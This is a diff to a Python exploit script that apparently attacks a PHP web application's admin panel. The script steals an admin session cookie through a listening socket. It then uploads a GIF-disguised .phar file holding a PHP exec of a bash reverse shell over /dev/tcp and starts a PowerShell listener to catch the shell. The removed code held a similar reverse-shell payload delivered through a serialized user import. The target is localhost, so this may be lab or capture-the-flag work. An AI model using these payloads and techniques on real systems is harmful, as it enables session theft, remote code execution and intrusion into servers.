@@ -95,41 +95,23 @@ def get_admin_session(host, lport, session):
     (sock_c, ip_c) = s.accept()
     get_request = sock_c.recv(4096)
     admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")
-
+    admin_cookie = admin_cookie.split('=')[1]
     print("[+] Stole admin's cookie:")
     print("    -- " + admin_cookie) 
     return admin_cookie
 
-def import_user(cookie, payload, target):
-	c = {"PHPSESSID":cookie}
-	d = {"userobj":payload}
-	r = requests.post("%s/admin/import_user.php"%URL,data=d,cookies=c)
-
-def code_injection(host, lport, session, cookie):
-    evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))
-
-    f = "/var/www/html/%s.php"%evil
-    c = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\"); ?>"%(host,lport)
-    c = base64.urlsafe_b64encode(c.encode("UTF-8")).decode("UTF-8")
-
-    proc = subprocess.Popen(["python", "serialize.py", f, c], stdout=subprocess.PIPE)
-    payload = proc.stdout.read()
-    print("[+] Generated payload!")
-
-    import_user(cookie, payload, host)
-    print("[*] Sent import user request (%s.php)"%(evil))
-
-    print("[*] Attempting to start reverse shell...")
-    subprocess.Popen([
-        "powershell",
-        "-Command",
-        f"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {lport}); $listener.Start(); $client = $listener.AcceptTcpClient();"
-    ])
-    time.sleep(1)
-    requests.get("%s/%s.php"%(URL,evil))
-
-    while True:
-        pass
+def upload_image(target, sessid):
+	f = {
+		'image':('%s.phar'%evil,payload,'image/gif'),
+		'title':(None,evil)
+	}
+	c = {"PHPSESSID":sessid}
+	r = requests.post("http://%s/admin/upload_image.php"%target,
+		cookies=c,
+		files=f,
+		allow_redirects=False
+	)
+	return "Success" in r.text
 
 if __name__ == "__main__":
 
@@ -155,6 +137,29 @@ if __name__ == "__main__":
     else:
         print("Logged in!")
         admin_cookie = get_admin_session("localhost", 8082, session)
-        code_injection("localhost", 8083, session, admin_cookie)
-        #TODO: get admin account
+        
+        lport = 9001
+        evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+        payload = "GIF98a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");?>"%\
+                    ("localhost",lport)
+        
+        if upload_image("localhost:8080", admin_cookie):
+            print("[+] Successfully uploaded script (%s.phar)!"%evil)
+        else:
+            print("[-] Failed while uploading script.")
+            sys.exit(-1)
+        
+        print("[*] Starting reverse shell...")
+        subprocess.Popen([
+            "powershell",
+            "-Command",
+            f"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {lport}); $listener.Start(); $client = $listener.AcceptTcpClient();"
+        ])
+        time.sleep(1)
+        requests.get("http://%s/images/%s.phar"%("localhost:8080",evil))
+
+        print("[+] Reverse shell started.")
+        while True:
+            pass
        
+   
